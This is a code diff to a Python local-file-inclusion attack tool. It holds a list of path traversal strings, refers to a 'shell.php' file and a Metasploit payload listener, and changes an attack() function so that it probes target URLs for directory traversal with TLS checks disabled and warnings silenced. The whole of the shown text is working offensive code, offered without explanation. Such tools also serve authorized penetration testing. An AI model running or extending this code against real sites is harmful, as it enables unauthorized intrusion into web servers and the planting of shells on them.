@@ -2,12 +2,14 @@ import sys
 from os.path import dirname, abspath, join
 from shutil import copy2
 import requests
+from urllib3.exceptions import InsecureRequestWarning
 
 PATH_TRAVERSAL = ['../', '..\\', '/../', './../']
 HERE = dirname(abspath(__file__))
 
 SHELL = join(HERE, "shell.php")
 
+requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
 
 class listener:
     """Generate payload that could be used by Metasploit
@@ -64,7 +66,7 @@ def cook(cookies):
     return c
 
 
-def attack(target, location, cookies=None, headers=None, payload=None, traverse=False, relative=False, data=None):
+def attack(target, location, cookies=None, headers=None, payload=None, traverse=False, relative=False, data=None, dt=False):
     """Perform specified type of LFI attack
 
     Arguments:
@@ -77,11 +79,16 @@ def attack(target, location, cookies=None, headers=None, payload=None, traverse=
         payload {str} -- Custom payload (default: {None})
         traverse {bool} -- traverse the URL (default: {False})
         relative {bool} -- check for relative URL (default: {False})
+        dt {bool}  --  Test for directory traversal (default: {False})
     """
 
     url = target+location
-    print(colors("[~] Testing: {}".format(url), 93))
     try:
+        if dt:
+            res = requests.get(url, headers=headers, verify=False)
+            if res.status_code == 200:
+                print(colors("[+] Vulnerable: "+ url , 92))
+
         response = requests.get(url, headers=headers, cookies=cookies, verify=False)
 
         if response.status_code != 200:
